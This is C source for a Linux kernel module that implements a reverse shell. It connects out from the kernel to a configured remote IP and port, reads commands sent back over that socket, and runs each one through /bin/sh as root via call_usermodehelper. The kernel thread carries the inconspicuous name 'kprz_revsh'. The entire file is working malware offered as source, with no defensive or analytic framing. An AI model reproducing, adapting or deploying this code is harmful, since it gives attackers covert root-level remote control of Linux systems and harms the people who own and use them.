#include "reverse_shell.h"
#include <linux/net.h>
#include <linux/in.h>
#include <linux/slab.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/string.h>
#include <net/sock.h>
#include <linux/kallsyms.h>

#define CMD_BUF_SIZE 512

static struct task_struct *reverse_shell_task;
static char target_ip[64] = {0};
static unsigned short target_port = 0;

static int reverse_shell_thread(void *data) {
    struct socket *sock;
    struct sockaddr_in server;
    int ret;
    char *cmd_buf;
    struct kvec vec;
    struct msghdr msg;

    if (strlen(target_ip) == 0 || target_port == 0)
        return -EINVAL;

    cmd_buf = kmalloc(CMD_BUF_SIZE, GFP_KERNEL);
    if (!cmd_buf)
        return -ENOMEM;

    ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
    if (ret < 0)
        goto out;

    memset(&server, 0, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_port = htons(target_port);
    server.sin_addr.s_addr = in_aton(target_ip);

    ret = sock->ops->connect(sock, (struct sockaddr *)&server, sizeof(server), 0);
    if (ret < 0)
        goto out_sock;

    while (!kthread_should_stop()) {
        memset(cmd_buf, 0, CMD_BUF_SIZE);
        memset(&msg, 0, sizeof(msg));

        vec.iov_base = cmd_buf;
        vec.iov_len = CMD_BUF_SIZE;

        ret = kernel_recvmsg(sock, &msg, &vec, 1, CMD_BUF_SIZE - 1, 0);
        if (ret > 0) {
            char *argv[] = { "/bin/sh", "-c", cmd_buf, NULL };
            static char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
            call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
        }
        msleep(100);
    }

out_sock:
    if (sock)
        sock_release(sock);
out:
    kfree(cmd_buf);
    return 0;
}

void configure_reverse_shell(const char *ip, unsigned short port) {
    strncpy(target_ip, ip, sizeof(target_ip) - 1);
    target_port = port;
}

void start_reverse_shell(void) {
    if (strlen(target_ip) == 0 || target_port == 0)
        return;

    if (!reverse_shell_task)
        reverse_shell_task = kthread_run(reverse_shell_thread, NULL, "kprz_revsh");
}
